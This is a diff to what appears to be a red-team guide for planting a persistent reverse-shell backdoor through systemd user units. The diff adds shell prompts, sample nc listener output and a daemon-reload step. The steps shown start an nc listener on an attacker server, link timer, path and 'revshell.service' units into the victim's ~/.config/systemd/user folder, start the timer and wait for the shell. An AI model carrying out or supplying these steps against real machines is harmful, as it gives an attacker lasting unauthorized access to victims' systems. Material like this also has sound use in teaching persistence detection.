@@ -48,7 +48,8 @@ The timer file (`execshell.timer`) uses:
 1. Stand up listener on attacker server
 
 ```sh
-nc -nlvp 4444
+$ nc -nlvp 4444
+listening on [any] 4444 ...
 ```
 
 2. Generate a service file to create the backdoor on the victim
@@ -86,19 +87,20 @@ RandomizedDelaySec=4s
 Persistent=true
 ```
 
-4. Install into the systemd user folder on the victim
+4. Install into the systemd user folder on the victim and reload the units
 
 ```sh
-mkdir -p ~/.config/systemd/user/
-ln -s `pwd`/execpath.timer ~/.config/systemd/user/
-ln -s `pwd`/execshell.path ~/.config/systemd/user/
-ln -s `pwd`/revshell.service ~/.config/systemd/user/
+$ mkdir -p ~/.config/systemd/user/
+$ ln -s `pwd`/execpath.timer ~/.config/systemd/user/
+$ ln -s `pwd`/execshell.path ~/.config/systemd/user/
+$ ln -s `pwd`/revshell.service ~/.config/systemd/user/
+$ systemctl --user daemon-reload
 ```
 
 5. Start the scheduled task
 
 ```sh
-systemctl --user start execshell.timer
+$ systemctl --user start execshell.timer
 ```
 
 6. Wait for the shell!
